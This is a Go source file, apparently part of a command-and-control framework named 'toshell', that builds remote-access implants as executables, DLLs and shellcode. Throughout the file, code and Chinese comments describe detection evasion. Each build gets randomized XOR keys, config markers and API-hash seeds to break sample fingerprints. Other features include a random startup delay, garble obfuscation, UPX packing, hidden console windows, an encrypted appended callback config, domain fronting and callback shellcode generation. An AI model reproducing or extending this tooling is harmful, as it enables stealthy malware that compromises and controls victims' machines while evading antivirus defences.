package builder

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/fs"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	donut "github.com/Binject/go-donut/donut"
	"toshell/internal/server/config"
	"toshell/internal/server/logging"
)

type Builder struct {
	config     *config.ImplantConfig
	implantDir string
	useGarble  bool
	useUPX     bool
	upxPath    string
}

type BuildOptions struct {
	Name         string
	Format       string
	Language     string // 植入端语言：go（默认）/ c（C 植入端，体积极小）
	ListenerID   string
	ServerURL    string
	Protocol     string
	Interval     uint32
	Jitter       uint32
	RetryCount   uint32
	RetryWait    uint32
	KillDate     string
	WorkingHours string
	RelayListen  string // 中继监听地址（非空启用中继角色，Beacon Mesh）
	FrontDomain  string // 域前置拟态域名：HTTPS 轮询通道的 TLS SNI + HTTP Host
	Transport    string // 通道类型：tcp / http（按 Protocol 推导；http 构建才包含轮询通道代码）
	Profile      string // 构建档案：full(默认,全功能) / light(精简,裁剪重量级模块减体积)
	Modules      []string
	OS           string
	Arch         string
	// Evasion options
	XOREncrypt   bool `json:"xor_encrypt"`
	XORKeySize   int  `json:"xor_key_size"`
	GarbleEnable bool `json:"garble_enabled"`
	UPXEnable    bool `json:"upx_enabled"`
	// 每构建随机的配置块魔数与 XOR 密钥（内部生成，打破跨样本同指纹；三端一致）
	CfgMagic string  `json:"-"`
	CfgKey   [4]byte `json:"-"`
	XfBase   byte    `json:"-"` // xd 线性密钥基准（替换固定 0x5A）
	// apihash FNV 种子/乘子（P1-4 随机化，使 API 哈希跨样本不同）
	ApiHashSeed uint32 `json:"-"`
	ApiHashMul  uint32 `json:"-"`
	// 启动随机延迟（秒）：植入端启动后随机休眠 [min,max] 秒，打乱"启动即行为"的检测节奏。
	StartDelayMin int `json:"startup_delay_min"`
	StartDelayMax int `json:"startup_delay_max"`
}

type BuildResult struct {
	Binary          []byte
	Config          []byte
	Shellcode       []byte
	ShellcodeHex    string
	ShellcodeBase64 string
	SHA256          string
	Format          string
	BuildTime       time.Time
	// Evasion metadata
	XORKey []byte `json:"xor_key,omitempty"`
	HasXOR bool   `json:"has_xor"`
}

func New() *Builder {
	cfg := config.Get()
	return newBuilder(&cfg.Implant)
}

func NewWithConfig(cfg *config.Config) *Builder {
	if cfg == nil {
		cfg = config.Get()
	}
	return newBuilder(&cfg.Implant)
}

func newBuilder(implantCfg *config.ImplantConfig) *Builder {
	garbleAvailable := false
	if _, err := exec.LookPath("garble"); err == nil {
		garbleAvailable = true
		logging.Info("builder", "garble detected, obfuscation available")
	} else {
		logging.Info("builder", "garble not found, obfuscation disabled (install: go install mvdan.cc/garble@latest)")
	}

	upxPath := resolveUPXPath()
	upxAvailable := upxPath != ""
	if upxAvailable {
		logging.Info("builder", "UPX detected (%s), compression available", upxPath)
	} else {
		logging.Info("builder", "UPX not found, compression disabled (bundled: upx/win64/upx.exe or upx/linux-amd64/upx next to server binary, or install: https://upx.github.io)")
	}

	return &Builder{
		config:     implantCfg,
		implantDir: resolveImplantTemplateDir(implantCfg),
		useGarble:  garbleAvailable,
		useUPX:     upxAvailable,
		upxPath:    upxPath,
	}
}

// resolveUPXPath 解析 UPX 可执行文件路径，按以下顺序回退：
//  1. 可执行文件同目录的 upx/<平台目录>/upx(.exe)（如 upx/win64/upx.exe、upx/linux-amd64/upx）
//  2. 可执行文件同目录的 upx/<平台目录>/upx-*/upx(.exe)（兼容带版本号的子目录）
//  3. 系统 PATH 中的 upx
//
// 返回空串表示未找到。
func resolveUPXPath() string {
	binName := "upx"
	if runtime.GOOS == "windows" {
		binName = "upx.exe"
	}

	// 平台目录仅按 GOOS 判断：服务端可能是 386 等架构编译，但运行环境是
	// 64 位系统时应使用对应平台的 UPX（win64/linux-amd64），与自身架构无关。
	platformDir := ""
	switch runtime.GOOS {
	case "windows":
		platformDir = "win64"
	case "linux":
		platformDir = "linux-amd64"
	}

	if platformDir != "" {
		if exePath, err := os.Executable(); err == nil {
			baseDir := filepath.Join(filepath.Dir(exePath), "upx", platformDir)
			logging.Debug("builder", "resolveUPXPath: exe=%s baseDir=%s bin=%s", exePath, baseDir, binName)
			if p := findUPXBinary(baseDir, binName); p != "" {
				return p
			}
		}
	}

	if p, err := exec.LookPath(binName); err == nil {
		return p
	}
	return ""
}

// findUPXBinary 在目录 baseDir 中查找 upx 二进制，优先 baseDir/upx，其次 baseDir/upx-* 子目录。
func findUPXBinary(baseDir, binName string) string {
	direct := filepath.Join(baseDir, binName)
	if info, err := os.Stat(direct); err == nil && !info.IsDir() {
		return direct
	}
	if entries, err := os.ReadDir(baseDir); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			cand := filepath.Join(baseDir, e.Name(), binName)
			if info, err := os.Stat(cand); err == nil && !info.IsDir() {
				return cand
			}
		}
	}
	return ""
}

// resolveImplantTemplateDir 解析植入端模板源码目录，按以下顺序回退：
//  1. 配置项 implant.template_dir
//  2. 环境变量 TOSHELL_IMPLANT_TEMPLATE_DIR
//  3. 可执行文件同目录的 implant/
//  4. 可执行文件同目录的 internal/server/builder/implant
//  5. 当前工作目录的 internal/server/builder/implant
//
// 均无效时返回默认相对路径，便于后续构建时报出清晰错误。
func resolveImplantTemplateDir(implantCfg *config.ImplantConfig) string {
	candidates := []string{}
	if implantCfg != nil && implantCfg.TemplateDir != "" {
		candidates = append(candidates, implantCfg.TemplateDir)
	}
	if env := os.Getenv("TOSHELL_IMPLANT_TEMPLATE_DIR"); env != "" {
		candidates = append(candidates, env)
	}

	if exePath, err := os.Executable(); err == nil {
		exeDir := filepath.Dir(exePath)
		candidates = append(candidates,
			filepath.Join(exeDir, "implant"),
			filepath.Join(exeDir, "internal", "server", "builder", "implant"),
		)
	}
	if wd, err := os.Getwd(); err == nil {
		candidates = append(candidates,
			filepath.Join(wd, "internal", "server", "builder", "implant"),
		)
	}

	for _, dir := range candidates {
		if dir == "" {
			continue
		}
		if info, err := os.Stat(dir); err == nil && info.IsDir() {
			// 要求目录内存在 main.go 模板，避免误命中空目录。
			if _, err := os.Stat(filepath.Join(dir, "main.go")); err == nil {
				logging.Info("builder", "using implant template dir: %s", dir)
				return dir
			}
		}
	}

	logging.Warn("builder", "implant template dir not found, falling back to default; configure implant.template_dir or TOSHELL_IMPLANT_TEMPLATE_DIR")
	return "internal/server/builder/implant"
}

const configBlockMagic = "TOSHELL_CFG_V1:"

// configBlockKey 配置块加密使用的循环密钥（位置无关）。
// 与服务端配置块写入 / 植入端解析保持完全一致。
var configBlockKey = [4]byte{0x5A, 0xC3, 0x2D, 0x9F}

// configBlockMagicEnc 是加密后的配置块标识（常量序列），
// 用于在二进制尾部定位配置块，无需解密整个文件。
var configBlockMagicEnc = xorBlockKey([]byte(configBlockMagic), configBlockKey[:])

// xorBlockKey 用循环密钥逐字节加密/解密（位置无关，长度不变）。
func xorBlockKey(b, key []byte) []byte {
	out := make([]byte, len(b))
	for i := 0; i < len(b); i++ {
		out[i] = b[i] ^ key[i%len(key)]
	}
	return out
}

// randomCfgMagic 生成一个随机短魔数字符串（仅 [a-zA-Z0-9]，避免干扰混淆/占位符）。
func randomCfgMagic() string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	buf := make([]byte, 12)
	for i := range buf {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		buf[i] = chars[n.Int64()]
	}
	return "cfg-" + string(buf) + ":"
}

// randomCfgKey 生成随机 4 字节 XOR 密钥（配置块加密用，替换固定 0x5A,0xC3,0x2D,0x9F）。
func randomCfgKey() [4]byte {
	var k [4]byte
	rand.Read(k[:])
	return k
}

// randomXfBase 生成随机 xd 线性密钥基准（替换固定 0x5A），每次构建不同，字符串密文随之变化。
func randomXfBase() byte {
	b := make([]byte, 1)
	rand.Read(b)
	return 0x21 + b[0]%0x80 // 避免与 0x5A 常有重叠；取 0x21..0xA0
}

// randomUint32 生成 < max 的随机 uint32（crypto/rand）。
func randomUint32(max int64) uint32 {
	n, _ := rand.Int(rand.Reader, big.NewInt(max))
	return uint32(n.Int64())
}

func (b *Builder) Build(opts BuildOptions) (*BuildResult, error) {
	// P0-1: 每构建生成随机配置块魔数 + XOR 密钥 + xd 密钥基准（三端一致），
	// 使不同样本的配置块/字符串加密字节不再相同，打破跨样本同指纹。
	opts.CfgMagic = randomCfgMagic()
	opts.CfgKey = randomCfgKey()
	opts.XfBase = randomXfBase()
	opts.ApiHashSeed = randomUint32(0x7FFFFFFF) | 1 // 奇数种子，且非 0
	opts.ApiHashMul = randomUint32(0x7FFFFFFF) | 1  // 奇数乘子（FNV 通常用奇数）

	// 启动随机延迟默认值：优先取设置页「植入端」配置（implant.startup_delay_min/max），未配则回退 5~30 秒随机
	if cfg := config.Get(); cfg != nil {
		if opts.StartDelayMin <= 0 {
			opts.StartDelayMin = cfg.Implant.StartupDelayMin
		}
		if opts.StartDelayMax <= 0 {
			opts.StartDelayMax = cfg.Implant.StartupDelayMax
		}
	}
	if opts.StartDelayMax < opts.StartDelayMin {
		opts.StartDelayMax = opts.StartDelayMin
	}
	if opts.StartDelayMax <= 0 {
		opts.StartDelayMin = 5
		opts.StartDelayMax = 30
	}
	if opts.StartDelayMin <= 0 {
		opts.StartDelayMin = 5
	}

	targetOS := opts.OS
	if targetOS == "" {
		targetOS = "windows"
	}

	// C 植入端：独立编译管线（当前支持 Windows exe，x86/x64）
	if opts.Language == "c" {
		if targetOS != "windows" {
			return nil, fmt.Errorf("C implant currently supports windows only")
		}
		result, err := b.buildCExecutable(opts)
		if err != nil {
			return nil, err
		}
		result.Format = opts.Format
		result.BuildTime = time.Now()
		if len(result.Binary) > 0 {
			hash := sha256.Sum256(result.Binary)
			result.SHA256 = hex.EncodeToString(hash[:])
		}
		return result, nil
	}

	var result *BuildResult
	var err error

	switch opts.Format {
	case "exe", "bin":
		result, err = b.buildExecutable(opts)
	case "dll", "so":
		result, err = b.buildLibrary(opts)
	case "shellcode":
		result, err = b.buildShellcode(opts)
	case "shellcode_bin":
		result, err = b.buildShellcodeBin(opts)
	case "raw":
		result, err = b.buildRaw(opts)
	default:
		return nil, fmt.Errorf("unsupported format: %s", opts.Format)
	}

	if err != nil {
		return nil, err
	}

	result.Format = opts.Format
	result.BuildTime = time.Now()

	if len(result.Binary) > 0 {
		hash := sha256.Sum256(result.Binary)
		result.SHA256 = hex.EncodeToString(hash[:])

		outputDir := b.config.OutputDir
		if outputDir == "" {
			outputDir = "./implants"
		}

		if err := os.MkdirAll(outputDir, 0755); err != nil {
			logging.Warn("builder", "Failed to create output directory: %v", err)
		} else {
			filename := b.GetOutputFilename(opts)
			outputPath := filepath.Join(outputDir, filename)

			var saveData []byte
			if opts.Format == "shellcode" {
				saveData = []byte(result.ShellcodeHex)
			} else {
				saveData = result.Binary
			}

			if err := os.WriteFile(outputPath, saveData, 0755); err != nil {
				logging.Warn("builder", "Failed to save implant: %v", err)
			} else {
				logging.Info("builder", "Implant saved to: %s", outputPath)
			}
		}
	}

	return result, nil
}

// GetOutputFilename returns the file name (without directory) that Builder.Build
// writes to disk for the given options. Callers use it to clean up the redundant
// copy so a single build never leaves two files behind.
func (b *Builder) GetOutputFilename(opts BuildOptions) string {
	filename := opts.Name
	if filename == "" {
		filename = fmt.Sprintf("implant-%d", time.Now().Unix())
	}

	ext := ""
	switch opts.Format {
	case "exe":
		ext = ".exe"
	case "dll":
		ext = ".dll"
	case "bin":
		if opts.OS == "windows" {
			ext = ".exe"
		}
	case "so":
		ext = ".so"
	case "shellcode":
		ext = ".txt"
	case "shellcode_bin":
		ext = ".bin"
	}

	if ext != "" && !strings.HasSuffix(filename, ext) {
		filename = filename + ext
	}

	return filename
}

func (b *Builder) buildExecutable(opts BuildOptions) (*BuildResult, error) {
	binary, err := b.compile(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to compile: %v", err)
	}

	configData, _ := json.Marshal(b.buildConfig(opts))

	// Append config block to the binary so implant can read it at runtime
	cfg := config.Get()
	encKeyB64 := base64.StdEncoding.EncodeToString([]byte(cfg.Listener.EncryptionKey))
	serverURL := opts.ServerURL
	if serverURL == "" {
		serverURL = opts.Protocol + "://" + cfg.Listener.Host + ":" + fmt.Sprintf("%d", cfg.Listener.Port)
	}
	binary = appendConfigBlock(binary, serverURL, encKeyB64, &opts)

	return &BuildResult{
		Binary:    binary,
		Config:    configData,
		Shellcode: binary,
	}, nil
}

func (b *Builder) buildLibrary(opts BuildOptions) (*BuildResult, error) {
	binary, err := b.compileLibrary(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to compile library: %v", err)
	}

	configData, _ := json.Marshal(b.buildConfig(opts))

	return &BuildResult{
		Binary:    binary,
		Config:    configData,
		Shellcode: binary,
	}, nil
}

func (b *Builder) buildRaw(opts BuildOptions) (*BuildResult, error) {
	binary, err := b.compile(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to compile: %v", err)
	}

	configData, _ := json.Marshal(b.buildConfig(opts))

	return &BuildResult{
		Binary:    binary,
		Config:    configData,
		Shellcode: binary,
	}, nil
}

func (b *Builder) compile(opts BuildOptions) ([]byte, error) {
	targetOS := opts.OS
	arch := opts.Arch
	if targetOS == "" {
		targetOS = "windows"
	}
	if arch == "" {
		arch = "amd64"
	}

	tmpDir, err := os.MkdirTemp("", "toshell-build-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	if err := b.copyImplantSource(tmpDir, targetOS); err != nil {
		return nil, fmt.Errorf("failed to copy implant source: %v", err)
	}

	if err := b.processTemplates(tmpDir, opts); err != nil {
		return nil, fmt.Errorf("failed to process templates: %v", err)
	}

	// Use garble if enabled and available
	useGarble := b.useGarble && opts.GarbleEnable

	// 通道类型：显式指定优先，否则按协议推导（http/https → http，其余 → tcp）
	transport := opts.Transport
	if transport == "" {
		transport = transportForProtocol(opts.Protocol)
	}

	// P0-1/P1-3: 先注入每构建随机的配置块魔数/密钥 + xd 密钥基准，
	// 再执行字符串混淆（用同一随机 xd 基准），最后编译（走 Go 植入端）。
	b.injectBuildConstants(tmpDir, &opts)
	if err := b.obfuscateImplantSources(tmpDir, opts.XfBase); err != nil {
		return nil, fmt.Errorf("failed to obfuscate implant source: %v", err)
	}

	binary, err := b.compileGoCode(tmpDir, targetOS, arch, useGarble, transport, opts.Profile)
	if err != nil {
		return nil, err
	}

	// UPX 压缩（仅 Windows exe 且 UPX 可用且开启）
	if b.useUPX && opts.UPXEnable && targetOS == "windows" && (opts.Format == "exe" || opts.Format == "bin") {
		compressed, err := b.compressWithUPX(binary)
		if err != nil {
			logging.Warn("builder", "UPX compression failed, using uncompressed: %v", err)
		} else {
			logging.Info("builder", "UPX compression: %d -> %d bytes (%.1f%%)",
				len(binary), len(compressed), float64(len(compressed))/float64(len(binary))*100)
			binary = compressed
		}
	}

	return binary, nil
}

func (b *Builder) compileLibrary(opts BuildOptions) ([]byte, error) {
	targetOS := opts.OS
	arch := opts.Arch
	if targetOS == "" {
		targetOS = "windows"
	}
	if arch == "" {
		arch = "amd64"
	}

	tmpDir, err := os.MkdirTemp("", "toshell-build-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	if err := b.copyImplantSource(tmpDir, targetOS); err != nil {
		return nil, fmt.Errorf("failed to copy implant source: %v", err)
	}

	if err := b.processTemplates(tmpDir, opts); err != nil {
		return nil, fmt.Errorf("failed to process templates: %v", err)
	}

	libFile := filepath.Join(tmpDir, "lib.go")
	libCode := b.generateLibraryCode(targetOS)
	if err := os.WriteFile(libFile, []byte(libCode), 0644); err != nil {
		return nil, err
	}

	return b.compileGoCode(tmpDir, targetOS, arch, false, "tcp", "full")
}

func (b *Builder) generateLibraryCode(targetOS string) string {
	if targetOS == "windows" {
		return `package main

import "C"

//export DllMain
func DllMain() {
}

func main() {
}
`
	}
	return `package main

import "C"

//export Init
func Init() {
}

func main() {
}
`
}

func (b *Builder) copyImplantSource(tmpDir, targetOS string) error {
	return filepath.WalkDir(b.implantDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}

		if d.IsDir() {
			return nil
		}

		relPath, err := filepath.Rel(b.implantDir, path)
		if err != nil {
			return err
		}

		filename := d.Name()

		data, err := os.ReadFile(path)
		if err != nil {
			return err
		}

		content := string(data)

		if strings.HasPrefix(filename, "platform_") {
			isWindows := strings.Contains(filename, "windows")
			if (targetOS == "windows" && !isWindows) || (targetOS != "windows" && isWindows) {
				return nil
			}
			content = strings.Replace(content, "//go:build windows\n\n", "", 1)
			content = strings.Replace(content, "//go:build !windows\n\n", "", 1)
			content = strings.Replace(content, "//go:build windows", "", 1)
			content = strings.Replace(content, "//go:build !windows", "", 1)
			relPath = "platform.go"
		}

		destPath := filepath.Join(tmpDir, relPath)

		if err := os.MkdirAll(filepath.Dir(destPath), 0755); err != nil {
			return err
		}

		return os.WriteFile(destPath, []byte(content), 0644)
	})
}

func (b *Builder) processTemplates(tmpDir string, opts BuildOptions) error {
	cfg := config.Get()
	key := []byte(cfg.Listener.EncryptionKey)

	mainFile := filepath.Join(tmpDir, "main.go")
	data, err := os.ReadFile(mainFile)
	if err != nil {
		return err
	}

	content := string(data)

	// 安全加固：{{SERVER_URL}} 位于 Go 字符串字面量内（serverAddr = "{{SERVER_URL}}"），
	// 用 cQuote 转义引号/反斜杠，防 `"; 任意代码; //` 注入编译出的植入体。
	// （cQuote 的转义规则与 Go/C 字符串字面量兼容：\\ \" \n \r \t）
	content = strings.ReplaceAll(content, "{{SERVER_URL}}", cQuote(opts.ServerURL))
	content = strings.ReplaceAll(content, "{{INTERVAL}}", fmt.Sprintf("%d", opts.Interval))
	content = strings.ReplaceAll(content, "{{RETRY_WAIT}}", fmt.Sprintf("%d", opts.RetryWait))

	// 心跳抖动百分比（0-100，0=固定间隔）
	content = strings.ReplaceAll(content, "{{JITTER_LINE}}",
		fmt.Sprintf("jitterPct = %d", opts.Jitter))

	// 重连退避基础等待（秒）
	content = strings.ReplaceAll(content, "{{RETRY_WAIT_LINE}}",
		fmt.Sprintf("retryWaitSec = %d", opts.RetryWait))
	if opts.RetryWait <= 0 {
		content = strings.ReplaceAll(content, "{{RETRY_WAIT_LINE}}",
			"retryWaitSec = 5")
	}

	// KillDate（自杀日期，YYYY-MM-DD，空=不启用）
	content = strings.ReplaceAll(content, "{{KILL_DATE_LINE}}",
		fmt.Sprintf("killDateStr = %q", opts.KillDate))

	// WorkingHours（工作时段，HH:MM-HH:MM，空=不启用）
	content = strings.ReplaceAll(content, "{{WORKING_HOURS_LINE}}",
		fmt.Sprintf("applyWorkingHours(%q)", opts.WorkingHours))

	// RelayListen（中继监听地址，空=不启用中继角色）
	content = strings.ReplaceAll(content, "{{RELAY_LISTEN_LINE}}",
		fmt.Sprintf("relayListen = %q", opts.RelayListen))

	// 加密密钥作为备用，主要通过配置块传递
	if len(key) > 0 {
		content = strings.ReplaceAll(content, "{{ENCRYPTION_KEY}}", base64.StdEncoding.EncodeToString(key))
	} else {
		content = strings.ReplaceAll(content, "{{ENCRYPTION_KEY}}", "")
	}

	// 启动随机延迟（min~max 秒）：植入端启动后休眠随机时长，打乱"启动即行为"检测
	content = strings.ReplaceAll(content, "{{STARTUP_DELAY_MIN}}", fmt.Sprintf("%d", opts.StartDelayMin))
	content = strings.ReplaceAll(content, "{{STARTUP_DELAY_MAX}}", fmt.Sprintf("%d", opts.StartDelayMax))

	return os.WriteFile(mainFile, []byte(content), 0644)
}

func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string) ([]byte, error) {
	// 编译期字符串混淆（免杀）改由 compile() 在注入每构建随机值之后统一调用，
	// 确保随机 xd 基准与注入值一致。

	// 条件编译标签：
	//   transport=http       → -tags transport_http（HTTPS 轮询通道，体积较大）
	//   transport=websocket  → -tags transport_ws（WebSocket 通道）
	//   transport=mqtt       → -tags transport_mqtt（MQTT pub/sub 通道）
	//   profile=light        → -tags light（裁剪截图/中继/注入/EDR 等重量级模块）
	buildTags := ""
	var tags []string
	switch transport {
	case "http":
		tags = append(tags, "transport_http")
	case "websocket":
		tags = append(tags, "transport_ws")
	case "mqtt":
		tags = append(tags, "transport_mqtt")
	}
	if profile == "light" {
		tags = append(tags, "light")
	}
	if len(tags) > 0 {
		buildTags = strings.Join(tags, " ")
	}

	// TLS 客户端实现文件按通道裁剪：
	//   - 非 HTTP 构建（TCP）：transport_tls_std.go / transport_tls_utls.go
	//     都带 transport_http 标签不参与编译，但 go mod tidy 解析 import 时
	//     仍会扫到 transport_tls_utls.go 的 utls 引用，把 utls/x/sys 升到
	//     需要更高 Go 版本的最新版（cannot compile Go 1.23 code）。
	//   - HTTP+light：只用标准库 TLS，删除 utls 实现。
	// 物理删除被排除文件，彻底避免 tidy 引入多余依赖。
	if transport != "http" {
		_ = os.Remove(filepath.Join(tmpDir, "transport_tls_std.go"))
		_ = os.Remove(filepath.Join(tmpDir, "transport_tls_utls.go"))
		logging.Debug("builder", "tcp profile: removed TLS client impl files (stdlib net/http not needed)")
	} else if profile == "light" {
		if err := os.Remove(filepath.Join(tmpDir, "transport_tls_utls.go")); err == nil {
			logging.Debug("builder", "light profile: removed transport_tls_utls.go (stdlib TLS)")
		}
	}

	// 老系统兼容：Windows 7 / Server 2008 R2 (NT 6.1) 没有 GetSystemTimePreciseAsFileTime
	// (该 API 仅 Windows 8+ 提供)。Go >= 1.22 编译的 exe 启动时会依赖它，
	// 在这些系统上会报"无法定位程序输入点"而无法启动。
	// 因此 Windows 载荷默认使用 Go 1.20.x（最后一个官方支持 Windows 7 的工具链）
	// 编译，保证 Server 2008 R2 / Windows 7 兼容。GOTOOLCHAIN 由本机 go 命令
	// (需 >= 1.21) 自动下载并缓存 go1.20.14，无需手动安装。
	// garble 模式与 go1.20 工具链不兼容，保持使用当前工具链。
	goToolchain := ""
	if targetOS == "windows" && !useGarble {
		goToolchain = "go1.20.14"
	}

	buildEnv := func(extra ...string) []string {
		env := append(os.Environ(),
			fmt.Sprintf("GOOS=%s", targetOS),
			fmt.Sprintf("GOARCH=%s", arch),
		)
		if goToolchain != "" {
			env = append(env, "GOTOOLCHAIN="+goToolchain)
		}
		return append(env, extra...)
	}

	// 依赖：模板自带 go.mod（锁定 go1.20 兼容版本）+ tools.go
	// （显式声明构建标签依赖，防止 tidy 升级到不兼容版本）。
	// copyImplantSource 已把 go.mod/go.sum/tools.go 复制到 tmpDir，
	// 这里只需 go mod download 拉取锁定版本，无需 init/get/tidy。
	downloadCmd := exec.Command("go", "mod", "download")
	downloadCmd.Dir = tmpDir
	downloadCmd.Env = buildEnv()
	if output, err := downloadCmd.CombinedOutput(); err != nil {
		fmt.Printf("go mod download output: %s\n", string(output))
	}

	var outputName string
	if targetOS == "windows" {
		outputName = "implant.exe"
	} else {
		outputName = "implant"
	}
	outputPath := filepath.Join(tmpDir, outputName)

	if useGarble {
		// Garble 混淆编译
		// 注意: garble flags 必须放在 build 命令之前 (garble -literals build ./pkg)
		// -literals: 混淆字符串字面量
		// -tiny: 最小化输出（移除调试信息）
		// -seed=random: 随机种子
		garbleArgs := []string{"-literals", "-tiny", "-seed=random", "build", "-trimpath"}
		if buildTags != "" {
			garbleArgs = append(garbleArgs, "-tags", buildTags)
		}
		// Windows 植入端默认无窗口（-H windowsgui 是 build 的 flag，须放在 build 之后）
		if targetOS == "windows" && os.Getenv("TOSHELL_CONSOLE") == "" {
			garbleArgs = append(garbleArgs, "-ldflags", "-H windowsgui")
		}
		garbleArgs = append(garbleArgs, "-o", outputPath, ".")
		buildCmd := exec.Command("garble", garbleArgs...)
		buildCmd.Dir = tmpDir
		buildCmd.Env = buildEnv("CGO_ENABLED=0")

		output, err := buildCmd.CombinedOutput()
		if err != nil {
			return nil, fmt.Errorf("garble build failed: %v, output: %s", err, string(output))
		}
		logging.Info("builder", "garble build successful for %s/%s", targetOS, arch)
	} else {
		// 标准 go build
		// -buildid= 去除 Go build ID，-trimpath 去掉源码绝对路径，降低静态指纹。
		// 注意：不要加 -buildmode=pie —— Windows PE 默认即支持 ASLR
		// （链接器自动设置 DYNAMIC_BASE），PIE 在 Windows/go1.20 下会让
		// 体积膨胀约 1.75MB（3.5MB → 5.26MB），纯属负担无收益。
		ldflags := "-s -w -buildid="
		// Windows 植入端默认隐藏控制台窗口（GUI 子系统），运行不弹窗。
		// 开发调试需要控制台日志时，构建服务端进程设 TOSHELL_CONSOLE=1 保留。
		if targetOS == "windows" && os.Getenv("TOSHELL_CONSOLE") == "" {
			ldflags += " -H windowsgui"
		}

		buildArgs := []string{"build", "-trimpath", "-o", outputPath, "-ldflags", ldflags}
		if buildTags != "" {
			buildArgs = append(buildArgs, "-tags", buildTags)
		}
		buildArgs = append(buildArgs, ".")
		buildCmd := exec.Command("go", buildArgs...)
		buildCmd.Dir = tmpDir
		buildCmd.Env = buildEnv("CGO_ENABLED=0")

		output, err := buildCmd.CombinedOutput()
		if err != nil {
			return nil, fmt.Errorf("build failed: %v, output: %s", err, string(output))
		}
	}

	return os.ReadFile(outputPath)
}

// compressWithUPX applies UPX compression to a Windows PE binary.
func (b *Builder) compressWithUPX(binary []byte) ([]byte, error) {
	if b.upxPath == "" {
		return nil, fmt.Errorf("UPX binary not found")
	}
	// Generate random suffix for temp file to avoid collisions
	suffix, _ := rand.Int(rand.Reader, big.NewInt(99999))
	tmpExe := filepath.Join(os.TempDir(), fmt.Sprintf("toshell_upx_%d.exe", suffix.Int64()))

	if err := os.WriteFile(tmpExe, binary, 0755); err != nil {
		return nil, fmt.Errorf("failed to write temp exe for UPX: %w", err)
	}
	defer os.Remove(tmpExe)

	cmd := exec.Command(b.upxPath, "--best", "--lzma", tmpExe)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("upx failed: %w, output: %s", err, string(output))
	}

	return os.ReadFile(tmpExe)
}

func (b *Builder) buildConfig(opts BuildOptions) map[string]interface{} {
	return map[string]interface{}{
		"server_url":    opts.ServerURL,
		"protocol":      opts.Protocol,
		"transport":     transportForProtocol(opts.Protocol),
		"interval":      opts.Interval,
		"jitter":        opts.Jitter,
		"retry_count":   opts.RetryCount,
		"retry_wait":    opts.RetryWait,
		"kill_date":     opts.KillDate,
		"working_hours": opts.WorkingHours,
		"relay_listen":  opts.RelayListen,
		"front_domain":  opts.FrontDomain,
		"modules":       opts.Modules,
	}
}

func (b *Builder) convertToShellcode(binary []byte) ([]byte, error) {
	return binary, nil
}

func GenerateConfig(serverURL string, interval, jitter uint32) ([]byte, error) {
	cfg := map[string]interface{}{
		"server_url": serverURL,
		"protocol":   "https",
		"interval":   interval,
		"jitter":     jitter,
	}
	return json.Marshal(cfg)
}

func (b *Builder) GetSupportedFormats(os string) []string {
	if os == "windows" {
		return []string{"exe", "dll", "shellcode", "shellcode_bin", "raw"}
	}
	return []string{"bin", "so", "raw"}
}

func (b *Builder) GetSupportedOS() []string {
	return []string{"windows", "linux", "darwin"}
}

func (b *Builder) GetSupportedArch() []string {
	return []string{"amd64", "386", "arm64"}
}

// GarbleAvailable returns whether garble obfuscation tool is installed.
func (b *Builder) GarbleAvailable() bool {
	return b.useGarble
}

// UPXAvailable returns whether UPX compression tool is installed.
func (b *Builder) UPXAvailable() bool {
	return b.useUPX
}

// GenerateQuickShellcode 快速生成注入用的shellcode
// 根据会话信息自动生成适合的shellcode
// callbackHost 为可选的回连 IP/域名，非空时优先使用（用于从请求上下文动态获取）
func (b *Builder) GenerateQuickShellcode(sessionOS, sessionArch string, callbackHost string) (*BuildResult, error) {
	cfg := config.Get()

	// 优先级：callbackHost > cfg.Listener.Host > cfg.Server.Host
	listenerHost := callbackHost
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Listener.Host
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		listenerHost = cfg.Server.Host
	}
	if listenerHost == "" || listenerHost == "0.0.0.0" {
		return nil, fmt.Errorf("无法确定 implant 回连地址：请在配置文件中将 listener.host 或 server.host 设置为服务器的实际 IP 地址，或通过 callbackHost 参数传入")
	}

	scheme := "http"
	if cfg.Listener.TLSEnabled {
		scheme = "https"
	}
	// 【关键】端口强制取自 cfg.Listener.Port，绝不从 HTTP Host 头解析
	serverURL := fmt.Sprintf("%s://%s:%d", scheme, listenerHost, cfg.Listener.Port)

	logging.Info("builder", "🔥 [CRITICAL DEBUG] GenerateQuickShellcode -> OS: %s, Arch: %s, callbackHost: [%s], finalHost: [%s], finalPort: [%d], serverURL: [%s]",
		sessionOS, sessionArch, callbackHost, listenerHost, cfg.Listener.Port, serverURL)

	opts := BuildOptions{
		OS:        sessionOS,
		Arch:      sessionArch,
		Format:    "shellcode",
		ServerURL: serverURL,
		Protocol:  cfg.Listener.Protocol,
		Interval:  cfg.Implant.Interval,
		Jitter:    cfg.Implant.Jitter,
		RetryWait: cfg.Implant.RetryWait,
	}

	return b.buildShellcode(opts)
}

// appendConfigBlock 在 shellcode 二进制尾部追加配置块。
// 格式：<encMagic> <4字节大端JSON长度(加密)> <JSON(加密)>
// encMagic 为加密后的配置块标识（常量），长度字段与 JSON 均用
// 循环密钥加密。二进制尾部不保留明文特征（项目标识、回连地址）。
// implant 启动时通过 encMagic 常量定位块起点，按长度字段解码解析。
// 除回连地址与加密密钥外，jitter/重连/KillDate/WorkingHours 等行为参数
// 一并写入配置块，使同一份植入端产物可被运行时配置动态调整。
// transportForProtocol 将构建协议映射为植入端通道类型：
// tcp → 自定义 TCP 帧协议；http/https → HTTP(S) 轮询（域前置）；
// websocket 当前无独立实现，回退 TCP；空 → 让植入端按 server_url 前缀回退。
